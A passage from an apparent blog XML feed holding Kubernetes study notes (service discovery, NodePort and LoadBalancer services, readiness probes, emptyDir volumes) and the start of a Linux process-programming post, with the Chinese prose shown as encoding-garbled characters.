title="ä»å†…éƒ¨é›†ç¾¤æµ‹è¯•æœåŠ¡"></a>ä»å†…éƒ¨é›†ç¾¤æµ‹è¯•æœåŠ¡</h5><ul><li>åˆ›å»ºä¸€ä¸ªpodï¼Œå®ƒå°†è¯·æ±‚å‘é€åˆ°æœåŠ¡çš„é›†ç¾¤IPå¹¶è®°å½•å“åº”ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹podæ—¥å¿—æ£€æŸ¥æœåŠ¡çš„å“åº”ã€‚</li><li>ä½¿ç”¨sshè¿œç¨‹ç™»å½•åˆ°å…¶ä¸­ä¸€ä¸ªKubernetesèŠ‚ç‚¹ä¸Šï¼Œç„¶åä½¿ç”¨curlå‘½ä»¤ã€‚</li><li>å¯ä»¥é€šè¿‡<code>kubectl exec</code>å‘½ä»¤åœ¨ä¸€ä¸ªå·²ç»å­˜åœ¨çš„podä¸­æ‰§è¡Œcurlå‘½ä»¤ã€‚</li></ul><p>æˆ‘ä»¬ä½¿ç”¨æœ€åä¸€ç§æ–¹å¼æ¥è¿›è¡Œæµ‹è¯•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec kubia-hvlfd -- curl -s http://10.111.239.153</span><br><span class="line">You've hit kubia-ndbnt</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥è§£é‡Šä¸€ä¸‹ä¸Šè¿°å‘½ä»¤æ‰§è¡Œäº†å“ªäº›æ“ä½œã€‚é¦–å…ˆæ˜¯åœ¨ä¸€ä¸ªpodå®¹å™¨ä¸Šï¼Œåˆ©ç”¨Kuberneteså»æ‰§è¡Œcurlå‘½ä»¤ï¼Œcurlå‘½ä»¤å‘ä¸€ä¸ªåç«¯æœ‰ä¸‰ä¸ªpodæœåŠ¡çš„IPå‘é€äº†HTTPè¯·æ±‚ï¼Œè¿™ä¸ªæ—¶å€™KubernetesæœåŠ¡ä»£ç†æ‹¦æˆªè¯¥è¿æ¥ï¼Œåœ¨ä¸‰ä¸ªpodä¸­ä»»æ„é€‰æ‹©äº†ä¸€ä¸ªpodï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™å®ƒã€‚<code>Node.js</code>åœ¨podä¸­è¿è¡Œå¤„ç†è¯·æ±‚ï¼Œå¹¶è¿”å›å¸¦æœ‰podåç§°çš„HTTPå“åº”ï¼Œæ¥ç€curlå‘½ä»¤å‘æ ‡å‡†è¾“å‡ºæ‰“å°è¿”å›å€¼ï¼Œè¯¥è¿”å›å€¼è¢«<code>kubectl</code>æˆªå–å¹¶æ‰“å°åˆ°ä¸»æœºçš„æ ‡å‡†è¾“å‡ºã€‚</p><h4 id="æœåŠ¡å‘ç°"><a href="#æœåŠ¡å‘ç°" class="headerlink" title="æœåŠ¡å‘ç°"></a>æœåŠ¡å‘ç°</h4><p>Kubernetesè¿˜ä¸ºå®¢æˆ·ç«¯æä¾›äº†å‘ç°æœåŠ¡çš„IPå’Œç«¯å£çš„æ–¹å¼</p><h5 id="é€šè¿‡ç¯å¢ƒå˜é‡å‘ç°æœåŠ¡"><a href="#é€šè¿‡ç¯å¢ƒå˜é‡å‘ç°æœåŠ¡" class="headerlink" title="é€šè¿‡ç¯å¢ƒå˜é‡å‘ç°æœåŠ¡"></a>é€šè¿‡ç¯å¢ƒå˜é‡å‘ç°æœåŠ¡</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec kubia-695cf env</span><br><span class="line">kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">HOSTNAME=kubia-695cf</span><br><span class="line">KUBIA_SERVICE_HOST=10.111.239.153</span><br><span class="line">KUBIA_SERVICE_PORT=80</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.96.0.1</span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br></pre></td></tr></table></figure><h5 id="é€šè¿‡DNSå‘ç°æœåŠ¡"><a href="#é€šè¿‡DNSå‘ç°æœåŠ¡" class="headerlink" title="é€šè¿‡DNSå‘ç°æœåŠ¡"></a>é€šè¿‡DNSå‘ç°æœåŠ¡</h5><p>è¿è¡Œä¸€ä¸ªDNSæœåŠ¡çš„podï¼Œåœ¨é›†ç¾¤ä¸­çš„å…¶ä»–podéƒ½è¢«é…ç½®æˆä½¿ç”¨å…¶ä½œä¸ºDNSï¼Œè¿è¡Œåœ¨podä¸Šçš„è¿›ç¨‹DNSæŸ¥è¯¢éƒ½ä¼šè¢«Kubernetesè‡ªèº«çš„DNSæœåŠ¡å™¨å“åº”ï¼Œè¯¥æœåŠ¡å™¨çŸ¥é“ç³»ç»Ÿä¸­è¿è¡Œçš„æ‰€æœ‰æœåŠ¡ã€‚</p><h4 id="å°†æœåŠ¡æš´éœ²ç»™å¤–éƒ¨å®¢æˆ·ç«¯"><a href="#å°†æœåŠ¡æš´éœ²ç»™å¤–éƒ¨å®¢æˆ·ç«¯" class="headerlink" title="å°†æœåŠ¡æš´éœ²ç»™å¤–éƒ¨å®¢æˆ·ç«¯"></a>å°†æœåŠ¡æš´éœ²ç»™å¤–éƒ¨å®¢æˆ·ç«¯</h4><ul><li>å°†æœåŠ¡çš„ç±»å‹è®¾ç½®æˆ<code>NodePort</code>ï¼šæ¯ä¸ªé›†ç¾¤èŠ‚ç‚¹éƒ½ä¼šåœ¨èŠ‚ç‚¹ä¸Šæ‰“å¼€ä¸€ä¸ªç«¯å£ï¼Œå¯¹äº<code>NodePort</code>æœåŠ¡ï¼Œæ¯ä¸ªé›†ç¾¤èŠ‚ç‚¹åœ¨èŠ‚ç‚¹æœ¬èº«ä¸Šæ‰“å¼€ä¸€ä¸ªç«¯å£ï¼Œå¹¶å°†åœ¨è¯¥ç«¯å£ä¸Šæ¥æ”¶åˆ°çš„æµé‡é‡å®šå‘åˆ°åŸºç¡€æœåŠ¡ï¼Œè¯¥æœåŠ¡ä»…åœ¨å†…éƒ¨é›†ç¾¤IPå’Œç«¯å£ä¸Šæ‰èƒ½è®¿é—®ï¼Œä½†ä¹Ÿå¯é€šè¿‡æ‰€æœ‰èŠ‚ç‚¹ä¸Šçš„ä¸“ç”¨ç«¯å£è®¿é—®ã€‚</li><li>å°†æœåŠ¡çš„ç±»å‹è®¾ç½®æˆ<code>LoadBalance</code>ï¼šè¿™æ˜¯<code>NodePort</code>ç±»å‹çš„ä¸€ç§æ‰©å±•ï¼Œè¿™ä½¿å¾—æœåŠ¡å¯ä»¥é€šè¿‡ä¸€ä¸ªä¸“ç”¨çš„è´Ÿè½½å‡è¡¡å™¨æ¥è®¿é—®ï¼Œè¿™æ˜¯ç”±Kubernetesä¸­æ­£åœ¨è¿è¡Œçš„äº‘åŸºç¡€è®¾æ–½æä¾›çš„ï¼Œè´Ÿè½½å‡è¡¡å™¨å°†æµé‡é‡å®šå‘åˆ°è·¨æ‰€æœ‰èŠ‚ç‚¹çš„èŠ‚ç‚¹ç«¯å£ï¼Œå®¢æˆ·ç«¯é€šè¿‡è´Ÿè½½å‡è¡¡å™¨çš„IPè¿æ¥åˆ°æœåŠ¡ã€‚</li><li>åˆ›å»ºä¸€ä¸ªIngressèµ„æºï¼šè¿™æ˜¯ä¸€ä¸ªå®Œå…¨ä¸åŒçš„æœºåˆ¶ï¼Œé€šè¿‡ä¸€ä¸ªIPåœ°å€å…¬å¼€å¤šä¸ªæœåŠ¡ï¼Œå®ƒè¿è¡Œåœ¨HTTPå±‚ï¼Œå› æ­¤å¯ä»¥æä¾›æ¯”å·¥ä½œåœ¨ç¬¬å››å±‚çš„æœåŠ¡æ›´å¤šçš„åŠŸèƒ½ã€‚</li></ul><h5 id="åˆ›å»ºNodePortç±»å‹çš„æœåŠ¡"><a href="#åˆ›å»ºNodePortç±»å‹çš„æœåŠ¡" class="headerlink" title="åˆ›å»ºNodePortç±»å‹çš„æœåŠ¡"></a>åˆ›å»ºNodePortç±»å‹çš„æœåŠ¡</h5><p>åˆ›å»ºä¸€ä¸ªåä¸º<code>kubia-svc-nodeport.yaml</code>çš„YAMLæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia-nodeport</span><br><span class="line">spec:</span><br><span class="line">  type: NodePort #ä¸ºNodePortè®¾ç½®æœåŠ¡ç±»å‹</span><br><span class="line">  ports:</span><br><span class="line">  - port: 80  #æœåŠ¡é›†ç¾¤IPçš„ç«¯å£å·</span><br><span class="line">    targetPort: 8080  #èƒŒåpodçš„ç›®æ ‡ç«¯å£å·</span><br><span class="line">    nodePort: 30123   #é€šè¿‡é›†ç¾¤èŠ‚ç‚¹çš„30123ç«¯å£å¯ä»¥è®¿é—®è¯¥æœåŠ¡</span><br><span class="line">  selector:</span><br><span class="line">    app: kubia</span><br></pre></td></tr></table></figure><p>åˆ›å»ºè¯¥æœåŠ¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-svc-nodeport.yaml</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¯¥æœåŠ¡çš„åŸºç¡€ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl get svc kubia-nodeport</span><br><span class="line">NAME             TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE</span><br><span class="line">kubia-nodeport   NodePort   10.107.251.184   &lt;none&gt;        80:30123/TCP   92s</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘æ˜¯é€šè¿‡Docker-desktop for macåœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡<code>localhost:30123</code>è¿›è¡Œè®¿é—®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % curl localhost:30123</span><br><span class="line">You've hit kubia-695cf</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾æ˜¾ç¤ºäº†æœåŠ¡æš´éœ²åœ¨ä¸¤ä¸ªé›†ç¾¤èŠ‚ç‚¹çš„ç«¯å£30123ä¸Šã€‚åˆ°è¾¾ä»»ä½•ä¸€ä¸ªç«¯å£çš„ä¼ å…¥è¿æ¥å°†è¢«é‡å®šå‘åˆ°ä¸€ä¸ªéšæœºé€‰æ‹©çš„podï¼Œè¯¥podæ˜¯å¦ä½äºæ¥æ”¶åˆ°è¿æ¥çš„èŠ‚ç‚¹ä¸Šæ˜¯ä¸ç¡®å®šçš„ã€‚</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/6.png" alt="6"></p><h5 id="åˆ›å»ºLoadBalanceæœåŠ¡"><a href="#åˆ›å»ºLoadBalanceæœåŠ¡" class="headerlink" title="åˆ›å»ºLoadBalanceæœåŠ¡"></a>åˆ›å»ºLoadBalanceæœåŠ¡</h5><p>åˆ›å»ºä¸€ä¸ªåä¸º<code>kubia-svc-loadbalancer.yaml</code>çš„YAMLæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia-loadbalancer</span><br><span class="line">spec:</span><br><span class="line">  type: LoadBalancer </span><br><span class="line">  ports:</span><br><span class="line">  - port: 80  </span><br><span class="line">    targetPort: 8080  </span><br><span class="line">  selector:</span><br><span class="line">    app: kubia</span><br></pre></td></tr></table></figure><p>åˆ›å»ºè¯¥æœåŠ¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-svc-loadbalancer.yaml</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾æ‰€ç¤ºä¸ºå¤–éƒ¨å®¢æˆ·ç«¯è¿æ¥ä¸€ä¸ªLoadBalanceræœåŠ¡</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/7.png" alt="7"></p><h4 id="å°±ç»ªæ¢é’ˆ"><a href="#å°±ç»ªæ¢é’ˆ" class="headerlink" title="å°±ç»ªæ¢é’ˆ"></a>å°±ç»ªæ¢é’ˆ</h4><p>å°±ç»ªæ¢æµ‹å™¨ä¼šå®šæœŸè°ƒç”¨ï¼Œå¹¶ç¡®å®šç‰¹å®šçš„podæ˜¯å¦æ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå½“å®¹å™¨çš„å‡†å¤‡å°±ç»ªæ¢æµ‹è¿”å›æˆåŠŸæ—¶ï¼Œè¡¨ç¤ºå®¹å™¨å·²ç»å‡†å¤‡å¥½æ¥æ”¶è¯·æ±‚ã€‚</p><h5 id="å°±ç»ªæ¢é’ˆç±»å‹"><a href="#å°±ç»ªæ¢é’ˆç±»å‹" class="headerlink" title="å°±ç»ªæ¢é’ˆç±»å‹"></a>å°±ç»ªæ¢é’ˆç±»å‹</h5><ul><li>Execæ¢é’ˆï¼Œæ‰§è¡Œè¿›ç¨‹çš„åœ°æ–¹ã€‚å®¹å™¨çš„çŠ¶æ€ç”±è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ä»£ç ç¡®å®š</li><li>HTTP GETæ¢é’ˆï¼Œå‘å®¹å™¨å‘é€HTTP GETè¯·æ±‚ï¼Œé€šè¿‡å“åº”çš„HTTPçŠ¶æ€ç åˆ¤æ–­å®¹å™¨æ˜¯å¦å‡†å¤‡å¥½</li><li>TCP socketæ¢é’ˆï¼Œæ‰“å¼€ä¸€ä¸ªTCPè¿æ¥åˆ°å®¹å™¨çš„æŒ‡å®šç«¯å£ï¼Œå¦‚æœè¿æ¥å·²å»ºç«‹ï¼Œåˆ™è®¤ä¸ºå®¹å™¨å·²å‡†å¤‡å°±ç»ª</li></ul><h4 id="å·"><a href="#å·" class="headerlink" title="å·"></a>å·</h4><p>Kubernetesçš„å·æ—¶podçš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå› æ­¤åƒå®¹å™¨ä¸€æ ·åœ¨podçš„è§„èŒƒä¸­å°±å®šä¹‰äº†ï¼Œå®ƒä»¬ä¸æ˜¯ç‹¬ç«‹çš„Kuberneteså¯¹è±¡ï¼Œä¹Ÿä¸èƒ½å•å‡ºåˆ›å»ºæˆ–åˆ é™¤ï¼Œpodä¸­çš„æ‰€æœ‰å®¹å™¨éƒ½å¯ä»¥ä½¿ç”¨å·ï¼Œä½†å¿…é¡»å…ˆå°†å®ƒæŒ‚è½½åœ¨æ¯ä¸ªéœ€è¦è®¿é—®å®ƒçš„å®¹å™¨ä¸­ï¼Œåœ¨æ¯ä¸ªå®¹å™¨ä¸­ï¼Œéƒ½å¯ä»¥åœ¨å…¶æ–‡ä»¶ç³»ç»Ÿçš„ä»»æ„ä½ç½®æŒ‚è½½å·ã€‚</p><h5 id="å·ç±»å‹"><a href="#å·ç±»å‹" class="headerlink" title="å·ç±»å‹"></a>å·ç±»å‹</h5><ul><li>emptyDirï¼šç”¨äºå­˜å‚¨ä¸´æ—¶æ•°æ®çš„ç®€å•ç©ºç›®å½•</li><li>hostPathï¼šç”¨äºå°†ç›®å½•ä»å·¥ä½œèŠ‚ç‚¹çš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°podä¸­</li><li>gitRepoï¼šé€šè¿‡æ£€å‡ºGitä»“åº“çš„å†…å®¹æ¥åˆå§‹åŒ–çš„å·</li><li>nfsï¼šæŒ‚è½½åˆ°podä¸­çš„NFSå…±äº«å·</li><li>gcePersistentDiskï¼šGoogleé«˜æ•ˆèƒ½å‹å­˜å‚¨ç£ç›˜å·</li><li>cinderã€cephfsã€iscsiã€flockerã€glusterfsã€quobyteã€rbdã€flexVolumeã€vsphere-Volumeã€photonPersistentDiskã€scaleIOç”¨äºæŒ‚è½½å…¶ä»–ç±»å‹çš„ç½‘ç»œå­˜å‚¨</li><li>configMapã€secretã€downwordAPIï¼šç”¨äºå°†Kuberneteséƒ¨åˆ†èµ„æºå’Œé›†ç¾¤ä¿¡æ¯å…¬å¼€ç»™podçš„ç‰¹æ®Šç±»å‹çš„å·</li><li>persistentVolumeClaimï¼šä¸€ç§ä½¿ç”¨é¢„ç½®æˆ–è€…åŠ¨æ€é…ç½®çš„æŒä¹…å­˜å‚¨ç±»å‹</li></ul><h5 id="åœ¨podä¸­ä½¿ç”¨emptyDirå·"><a href="#åœ¨podä¸­ä½¿ç”¨emptyDirå·" class="headerlink" title="åœ¨podä¸­ä½¿ç”¨emptyDirå·"></a>åœ¨podä¸­ä½¿ç”¨emptyDirå·</h5><p>ç°åœ¨æœ‰ä¸¤ä¸ªé•œåƒéœ€è¦è¿è¡Œåœ¨podä¸Šï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªåä¸º<code>fortune-pod.yaml</code>çš„æ–‡ä»¶ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">fortune</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">luksa/fortune</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">html-generator</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/var/htdocs</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:alpine</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">web-server</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/usr/share/nginx/html</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">    <span class="attr">emptyDir:</span> <span class="string">&#123;&#125;</span></span><br></pre></td></tr></table></figure><p>podåŒ…å«ä¸¤ä¸ªå®¹å™¨å’Œä¸€ä¸ªæŒ‚è½½åœ¨ä¸¤ä¸ªå®¹å™¨ä¸­çš„å…±ç”¨çš„å·ï¼Œä½†åœ¨ä¸åŒçš„è·¯å¾„ä¸Šã€‚å½“<code>html-generator</code>å®¹å™¨å¯åŠ¨æ—¶ï¼Œå®ƒæ¯10ç§’å¯åŠ¨ä¸€æ¬¡fortuneå‘½ä»¤è¾“å‡ºåˆ°<code>var/htdocs/index.html</code>æ–‡ä»¶ï¼Œå› ä¸ºå·æ˜¯åœ¨<code>/var/htdocs</code>ä¸ŠæŒ‚è½½çš„ï¼Œæ‰€ä»¥<code>index.html</code>æ–‡ä»¶è¢«å†™å…¥å·ä¸­ï¼Œè€Œä¸æ˜¯å®¹å™¨çš„é¡¶å±‚ï¼Œä¸€æ—¦<code>web-server</code>å®¹å™¨å¯åŠ¨ï¼Œä»–å°±å¼€å§‹ä¸º<code>/usr/share/nginx/html</code>ç›®å½•ä¸­çš„ä»»æ„HTMLæ–‡ä»¶æä¾›æœåŠ¡ï¼Œå› ä¸ºæˆ‘ä»¬å°†å·æŒ‚è½½åœ¨é‚£ä¸ªç¡®åˆ‡çš„ä½ç½®ï¼ŒNginxå°†ä¸ºè¿è¡Œfortuneå¾ªç¯çš„å®¹å™¨è¾“å‡ºçš„<code>index.html</code>æ–‡ä»¶æä¾›æœåŠ¡ï¼Œæœ€ç»ˆçš„æ•ˆæœæ˜¯ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯å‘podä¸Šçš„80ç«¯å£å‘é€ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œå°†æ¥æ”¶å½“å‰çš„fortuneæ¶ˆæ¯ä½œä¸ºå“åº”ã€‚</p><p>ä¸ºäº†æŸ¥çœ‹fortuneæ¶ˆæ¯ï¼Œéœ€è¦å¯åŠ¨å¯¹podçš„è®¿é—®ï¼Œå¯ä»¥å°è¯•å°†ç«¯å£ä»æœ¬åœ°æœºå™¨è½¬å‘åˆ°podæ¥å®ç°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl port-forward fortune 8080:80</span><br><span class="line">Forwarding from 127.0.0.1:8080 -&gt; 80</span><br><span class="line">Forwarding from [::1]:8080 -&gt; 80</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>curl</code>å‘½ä»¤è®¿é—®NginxæœåŠ¡å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">All things that are, are with more spirit chased than enjoyed.</span><br><span class="line">-- Shakespeare, "Merchant of Venice"</span><br><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">A horse!  A horse!  My kingdom for a horse!</span><br><span class="line">-- Wm. Shakespeare, "Richard III"</span><br><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">Avoid gunfire in the bathroom tonight.</span><br><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">For courage mounteth with occasion.</span><br><span class="line">-- William Shakespeare, "King John"</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;å¯¹äºã€ŠKubernetes in actionã€‹è¿™æœ¬ä¹¦å‰ä¸‰ç« èŠ‚ç›¸å…³çš„ç¬”è®°ï¼Œæˆ‘éƒ½è®°å½•åœ¨ä¸‹é¢è¿™ä¸ªé“¾æ¥äº†ï¼Œæœ‰éœ€æ±‚çš„å¯ä»¥çœ‹çœ‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Linuxç³»ç»Ÿç¼–ç¨‹(äºŒ)</title>
    <link href="elssm.github.io/2021/10/05/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E4%BA%8C/"/>
    <id>elssm.github.io/2021/10/05/Linuxç³»ç»Ÿç¼–ç¨‹-äºŒ/</id>
    <published>2021-10-05T06:22:18.000Z</published>
    <updated>2021-12-13T09:49:13.256Z</updated>
    
    <content type="html"><![CDATA[<h4 id="è¿›ç¨‹å’Œç¨‹åº"><a href="#è¿›ç¨‹å’Œç¨‹åº" class="headerlink" title="è¿›ç¨‹å’Œç¨‹åº"></a>è¿›ç¨‹å’Œç¨‹åº</h4><ul><li>ç¨‹åºï¼šåªå ç”¨ç£ç›˜ç©ºé—´</li><li>è¿›ç¨‹ï¼šè¿è¡Œèµ·æ¥çš„ç¨‹åºï¼Œå ç”¨å†…å­˜ã€CPUç­‰ç³»ç»Ÿèµ„æº</li></ul><h4 id="è¿›ç¨‹æ§åˆ¶å—PCB"><a href="#è¿›ç¨‹æ§åˆ¶å—PCB" class="headerlink" title="è¿›ç¨‹æ§åˆ¶å—PCB"></a>è¿›ç¨‹æ§åˆ¶å—PCB</h4><ul><li>è¿›ç¨‹idï¼šç³»ç»Ÿä¸­æ¯ä¸ªè¿›ç¨‹æœ‰å”¯ä¸€çš„idï¼Œåœ¨Cè¯­è¨€ä¸­ç”¨<code>pid_t</code>ç±»å‹è¡¨ç¤ºï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°</li><li>è¿›ç¨‹çš„çŠ¶æ€ï¼šæœ‰å°±ç»ªã€è¿è¡Œã€æŒ‚èµ·ã€åœæ­¢ç­‰çŠ¶æ€</li><li>è¿›ç¨‹åˆ‡æ¢æ—¶éœ€è¦ä¿å­˜å’Œæ¢å¤çš„ä¸€äº›CPUå¯„å­˜å™¨</li><li>æè¿°è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¿¡æ¯</li><li>æè¿°æ§åˆ¶ç»ˆç«¯çš„ä¿¡æ¯</li><li>å½“å‰å·¥ä½œç›®å½•</li><li>umaskæ©ç </li><li>æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼ŒåŒ…å«å¾ˆå¤šæŒ‡å‘fileç»“æ„ä½“çš„æŒ‡é’ˆ</li><li>å’Œä¿¡å·ç›¸å…³çš„ä¿¡æ¯</li><li>ç”¨æˆ·idå’Œç»„id</li><li>ä¼šè¯ï¼ˆSessionï¼‰å’Œè¿›ç¨‹ç»„</li><li>è¿›ç¨‹å¯ä»¥ä½¿ç”¨çš„èµ„æºä¸Šé™</li></ul><h4 id="è¿›ç¨‹æ§åˆ¶"><a href="#è¿›ç¨‹æ§åˆ¶" class="headerlink" title="è¿›ç¨‹æ§åˆ¶"></a>è¿›ç¨‹æ§åˆ¶</h4><h5 id="forkå‡½æ•°"><a href="#forkå‡½æ•°" class="headerlink" title="forkå‡½æ•°"></a>forkå‡½æ•°</h5><p>åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pid_t fork(void)</span><br><span class="line"></span><br><span class="line">çˆ¶å­è¿›ç¨‹å„è‡ªè¿”å›</span><br><span class="line">çˆ¶è¿›ç¨‹è¿”å›å­è¿›ç¨‹pid</span><br><span class="line">å­è¿›ç¨‹è¿”å›0</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span 